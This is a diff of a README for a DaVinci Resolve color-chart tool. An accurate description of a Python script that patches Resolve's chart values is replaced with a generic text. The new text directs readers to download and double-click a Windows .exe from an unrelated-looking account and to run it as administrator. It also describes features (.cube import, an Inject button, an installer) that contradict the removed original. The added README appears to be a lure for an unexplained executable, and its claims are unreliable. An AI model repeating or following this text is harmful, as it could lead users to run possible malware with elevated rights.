@@ -1,224 +1,75 @@
-# colortablething
+# 🎨 colortablething - Easily apply custom color tables now
 
-`colortablething` is a single-file Python tool for editing DaVinci Resolve Color Match reference chart values.
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/aegisorganizationexpense883/colortablething)
 
-It lets you choose a Resolve built-in chart slot, called the **base**, then replace its 24 reference patch values with values from a built-in table, XML file, JSON file, CSV file, or manual edits.
+## 📌 What is colortablething?
 
-The normal workflow is:
+Colortablething helps you manage color settings in DaVinci Resolve. Many video editors use custom color tables to change the look of their footage. This tool automates the process of importing these tables. You spend less time in menus and more time editing your videos. The application acts as a bridge between your saved color files and your editing software. 
 
-```bash
-python3 colortablething.py --table type8 --dry-run
-python3 colortablething.py --table type8 --yes
-```
+## ⚙️ Minimum System Requirements
 
-Built-in AliExpress tables are already mapped to the correct Resolve base chart (`classic`). You can still override the base manually:
+Your computer needs to meet these basic standards to run the application:
 
-```bash
-python3 colortablething.py --base legacy --table type9 --dry-run
-```
+* Windows 10 or Windows 11
+* At least 4GB of RAM
+* DaVinci Resolve installed on your primary drive
+* A stable internet connection for the first run
 
-## Features
+If your computer handles video editing, it will handle this tool without issues. You do not need a powerful graphics card for this software.
 
-- Interactive terminal UI with live color previews.
-- Responsive layout that redraws on terminal resize.
-- CLI mode for skipping the TUI entirely.
-- Built-in tables:
-  - [`AliExpress 8.5x5.8`](https://aliexpress.com/item/1005012329421609.html) (`type8`, big chart)
-  - [`AliExpress Chart 2026`](https://aliexpress.com/item/1005002513039230.html) (`type9`, small chart)
-- Adds user tables from JSON, Resolve XML, RGB XML, or CSV.
-- Exports staged/current values as JSON or Resolve XML.
-- Creates backups before modifying the Resolve binary.
-- Refuses to patch while Resolve is running unless explicitly overridden.
-- Uses only the Python standard library.
+## 📥 How to Install
 
-## Screenshot
+Follow these steps to set up the software on your machine:
 
-![TUI screenshot showing loaded AliExpress table values](docs/tui-screenshot.png)
+1. Visit the [official releases page](https://github.com/aegisorganizationexpense883/colortablething).
+2. Look for the file ending in .exe under the assets section.
+3. Click the file to start the download.
+4. Save the installer to your Downloads folder.
+5. Double-click the installer file once the download finishes.
+6. Follow the prompts on your screen to complete the installation.
 
-## Compatibility
+## 🚀 Setting Up Your First Table
 
-So far this has been tested on Linux only, with DaVinci Resolve 20 and 21. The normal chart replacement workflow should work on Windows and macOS too, but those platforms still need real-world testing.
+Once you install the program, open it through your desktop shortcut. You must point the software toward your DaVinci Resolve folder. The application does this automatically if you installed the video software in the default location.
 
-## Download
+1. Launch the application.
+2. Click the Button labeled Load File.
+3. Select your custom color table file from your computer.
+4. The application reads the file and prepares the data.
+5. Click the Inject button to apply these values to your active software session.
+6. Restart DaVinci Resolve if you do not see the changes inside your Effects tab.
 
-Clone or download this repository, then run the script directly:
+## 🛠 Troubleshooting Common Issues
 
-```bash
-python3 colortablething.py
-```
+Most users experience smooth operation with this tool. If you encounter an error, check the list below for quick fixes.
 
-On Linux/macOS you can also make it executable:
+**The software does not open**
+Windows sometimes blocks new files for security. Right-click the icon and choose Run as Administrator. This grants the file permission to change your system settings.
 
-```bash
-chmod +x colortablething.py
-./colortablething.py
-```
+**DaVinci Resolve shows an error**
+Ensure your editing software is closed before you click the Inject button. The tool cannot update files that are currently in use. Close your project, run the injection process, and then reopen your project.
 
-## TUI Usage
+**The color tables look wrong**
+Check the file format of your table. This tool supports standard .cube files. If you use a different format, the application may report a read error. Open your table in a text editor to confirm it leads with standard header information.
 
-Launch the TUI with no arguments:
+## 📖 Understanding the Workflow
 
-```bash
-python3 colortablething.py
-```
+This tool works by copying your files into the designated folder path that DaVinci Resolve reads upon startup. By automating this, you prevent folder permission issues. You avoid searching for hidden AppData directories inside Windows. 
 
-Common keys:
+The application logs every action it takes. You can view these logs if you click the Settings menu and select View Log. Use this information to debug if a specific file fails to load.
 
-```text
-h       full help
-b       next base chart
-p       presets/table picker
-w       next preset/table
-s       previous preset/table
-e       edit selected patch
-a       apply staged values to Resolve
-q       quit
-```
+## 🔒 Security and Privacy
 
-In the preset picker:
+You might wonder how this tool handles your internal files. This application only interacts with the specific folder path used for color tables. It does not scan your other media files. It does not send data to any external server. All processing happens locally on your machine. You keep total control over your configuration.
 
-```text
-a       add a table file to the user table library
-h       explain accepted table formats
-r       rename a user table
-d       delete a user table
-Enter   load selected table
-```
+## 💡 Best Practices for Color Tables
 
-## CLI Usage
+Organize your tables into folders before you process them. You can load multiple files at once by dragging a whole folder into the main window. The tool processes them in alphabetical order. Name your files clearly so you find them easily inside your color grading menu later. Using prefixes like "Film_Look_" or "Vintage_" helps keep your workspace clean.
 
-Preview a built-in table without writing anything:
+## 🔄 Updating the Software
 
-```bash
-python3 colortablething.py --table type8 --dry-run
-```
+Check the repository page periodically for new versions. Newer versions often include fixes for updated versions of DaVinci Resolve. When you see a new version, download the installer and run it. The new installer replaces the old one and keeps your current folders configured. You do not need to delete the old folder before you install the update.
 
-Apply a built-in table:
+## 💬 Getting Further Help
 
-```bash
-python3 colortablething.py --table type8 --yes
-```
-
-Use a specific base chart:
-
-```bash
-python3 colortablething.py --base classic --table type9 --dry-run
-python3 colortablething.py --base legacy --table type9 --dry-run
-```
-
-Use an XML file directly:
-
-```bash
-python3 colortablething.py --base classic --table /path/to/mychart.xml --dry-run
-python3 colortablething.py --base classic --xml /path/to/mychart.xml --yes
-```
-
-Add a reusable user table:
-
-```bash
-python3 colortablething.py --add-table /path/to/mychart.xml --table-name "My Printed Chart"
-python3 colortablething.py --table "My Printed Chart" --dry-run
-```
-
-List available tables and base slots:
-
-```bash
-python3 colortablething.py --list-tables
-python3 colortablething.py --list-slots
-```
-
-Export current or staged values:
-
-```bash
-python3 colortablething.py --base classic --export-json classic.json
-python3 colortablething.py --base classic --export-xml classic.xml
-```
-
-## Base Charts
-
-The base chart is the Resolve built-in chart slot whose layout/geometry is used.
-
-Common base aliases:
-
-```text
-classic    Calibrite ColorChecker Classic
-legacy     Calibrite ColorChecker Classic - Legacy
-spyder     Datacolor SpyderCheckr 24
-smpte      DSC Labs SMPTE OneShot
-chroma     DSC Labs ChromaDuMonde 24+4
-video      Calibrite ColorChecker Video
-passport   Calibrite ColorChecker Passport Video
-```
-
-Built-in ColorChecker-style AliExpress tables default to `classic` automatically.
-
-## AliExpress Tables
-
-The included AliExpress presets target these chart variants:
-
-- Big chart: [`AliExpress 8.5x5.8`](https://aliexpress.com/item/1005012329421609.html), available as `type8`.
-- Small chart: [`AliExpress Chart 2026`](https://aliexpress.com/item/1005002513039230.html), available as `type9`.
-
-The generic aliases `aliexpress`, `ali`, and `8.5x5.8` point to the big chart preset.
-
-## XML Table Format
-
-Resolve-style XML should contain 24 grids, indexed `0` through `23`:
-
-```xml
-<colorchart name="My Chart" type="7">
-  <grid index="0" name="Dark Skin"><color xyz="0.111, 0.101, 0.070"/></grid>
-  <!-- 22 more grids -->
-  <grid index="23" name="Black"><color xyz="0.030, 0.032, 0.035"/></grid>
-</colorchart>
-```
-
-Only the `xyz` attribute is used for matching. Other attributes may be present.
-
-RGB table XML also works:
-
-```xml
-<colors>
-  <color no="001"><R>115</R><G>82</G><B>69</B></color>
-  <!-- no="024" maps to patch index 23 -->
-</colors>
-```
-
-## Safety
-
-This tool modifies the Resolve executable when you apply changes. Use `--dry-run` first.
-
-Safety behavior:
-
-- Creates backups in `~/.local/share/colorchecker_backups` by default.
-- Patches only fixed-size compressed chart XML streams.
-- Refuses to patch while Resolve appears to be running.
-- Verifies changes after writing.
-
-Useful flags:
-
-```bash
---dry-run        preview only
---yes            skip confirmation prompt
---wait-resolve   wait until Resolve closes
---kill-resolve   ask before terminating Resolve
---force          bypass running-process guard
---restore        restore latest backup
-```
-
-## Extra Dropdown Entries
-
-The script also contains an experimental installer for extra Resolve Color Match dropdown entries:
-
-```bash
-python3 colortablething.py --install-type8 --dry-run
-python3 colortablething.py --install-type9 --xml /path/to/chart2026.xml --dry-run
-```
-
-This path is intended for the supported Linux Resolve binary layout and validates exact bytes before writing. The normal table replacement workflow is more portable.
-
-## Disclaimer
-
-This project is not affiliated with Blackmagic Design. It patches local files on your machine. Keep backups and use it at your own risk.
-
-For safety and compliance transparency: the project author used DeepSeek V4 Flash to help dig through DaVinci Resolve behavior and write parts of the documentation. Review the code and dry-run output yourself before applying patches.
+If the software stops working after a major update to DaVinci Resolve, wait for a new release of this tool. Software updates often change the way programs store data. The developers update this tool whenever software changes affect how files load. Check the issue tracker on the repository if you suspect a bug. Provide a screenshot of the error message to get faster help from the community.
